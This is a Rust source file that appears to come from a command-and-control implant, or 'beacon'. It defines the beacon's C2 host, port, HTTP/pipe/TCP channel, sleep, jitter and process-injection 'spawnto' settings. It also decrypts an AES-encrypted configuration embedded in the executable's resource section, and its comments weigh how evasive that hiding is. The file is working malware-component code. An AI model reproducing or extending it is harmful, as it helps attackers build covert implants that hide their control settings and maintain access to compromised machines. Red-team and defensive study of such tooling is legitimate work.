use crate::communication::{
    HttpConfiguration, 
    PipeConfiguration, 
    TcpConfiguration
};

use crate::utilities::Utilities;
use crate::utilities::encryption::aes::Aes;

use anyhow::{anyhow, Result};
use serde_json::Value;

use windows_sys::Win32::System::LibraryLoader::{
    FindResourceW,
    LoadResource,
    SizeofResource,
    LockResource,
};

use std::ptr::null_mut;

// Enum with all the communication methods from /src/communication/mod.rs
pub enum CommunicationMethod {
    Http(HttpConfiguration),
    Pipe(PipeConfiguration),
    Tcp(TcpConfiguration),
}

// Structure for the Beacon communication
pub struct BeaconCom {
    pub host: String,
    pub port: String,
    pub method: String,
    pub methodinfo: CommunicationMethod,
}

// Structure for the Beacon configuration
pub struct Configuration {
    pub beacon: BeaconCom,
    pub sleeptime: String,
    pub jitter: String,
    pub pubkey: String,
    pub aes_key: [u8; 32],
    pub pid: String,
    pub spawnto_x64: String,
    pub spawnto_x32: String,
}

// How to embed the configuration into the beacon?
// A couple of options;
//
// -> .rsrc section in PE
// -> .data section in PE
// -> from parameters
// -> from a local config file

impl Configuration {

    // Extract the configuration and populate the Configuration and BeaconCom structs
    pub fn new() -> Self {

        if let Ok(config) = decrypt_configuration() {
            return Self {
                beacon: BeaconCom {
                    host: config["beacon"]["host"].to_string(),
                    port: config["beacon"]["port"].to_string(),
                    method: config["beacon"]["method"].to_string(),
                    methodinfo: parse_method_info(&config["beacon"]["method"], &config["beacon_type"]["methodinfo"]),
                },
                sleeptime: config["sleeptime"].to_string(),
                jitter: config["jitter"].to_string(),
                pubkey: config["pubkey"].to_string(),
                aes_key: [0u8; 32],
                pid: "".to_string(),
                spawnto_x64: config["spawnto_x64"].to_string(),
                spawnto_x32: config["spawnto_x32"].to_string(),
            }
        }

        // If the configuration cannot be decrypted, there is not much we can do.
        // There is no fallback configuration, so we just exit out of the process.
        std::process::exit(0x100);
    }
}

fn parse_method_info(method: &serde_json::Value, methodinfo: &serde_json::Value) -> CommunicationMethod {
    match method.as_str() {
        Some("http") => CommunicationMethod::Http(HttpConfiguration {
            useragent: methodinfo["useragent"].to_string(),
            http_uri: methodinfo["http_uri"].to_string(),
            headers: methodinfo["headers"].as_array().map_or_else(Vec::new, |arr| {
                arr.iter().map(|v| v.to_string()).collect()
            }),
            uri_append: methodinfo["append"].to_string(),
        }),
        Some("pipe") => CommunicationMethod::Pipe(PipeConfiguration {
            pipename: methodinfo["pipename"].to_string(),
        }),
        Some("tcp") => CommunicationMethod::Tcp(TcpConfiguration {
            host: methodinfo["host"].to_string(),
            port: methodinfo["port"].to_string(),
        }),
        _ => std::process::exit(0x100),
    }
}

fn decrypt_configuration() -> Result<Value> {
    // Decrypt the configuration which is embedded in .rsrc type 100
    // The Decryption key is embedded at .rsrc type 200

    // Is the smartest? most evasive? most sophisticated way of protecting a configuration
    // No.. anybody that can extract .rsrc headers will be able to decrypt the configuration
    // But atleast it works for now.

    let encrypted_config_bytes = unsafe { extract_configuration_from_rsrc(100) };
    let encrypted_config_key = unsafe { extract_configuration_from_rsrc(200) };

    let mut aes = Aes::new(encrypted_config_bytes);
    aes.set_key(Utilities::vec_to_key_array(encrypted_config_key));
    let decrypted_configuration = aes.decrypt();

    if let Ok(configuration) = std::str::from_utf8(&decrypted_configuration) {
        let v: Value = serde_json::from_str(configuration)?;
        return Ok(v);
    }

    Err(anyhow!("Wrong key"))
}

unsafe fn extract_configuration_from_rsrc(resource_type: u32) -> Vec<u8> {
    // Configuration extraction from the .rsrc section in PE struct
     
    let resource_handle = FindResourceW(null_mut(), null_mut(), resource_type as _);
    let resource_data = LoadResource(null_mut(), resource_handle);
    let resource_size = SizeofResource(null_mut(), resource_handle) as usize;
    let resource_bytes = LockResource(resource_data) as *const u8;
    let encrypted_bytes = std::slice::from_raw_parts(resource_bytes, resource_size);
    encrypted_bytes.to_vec()
}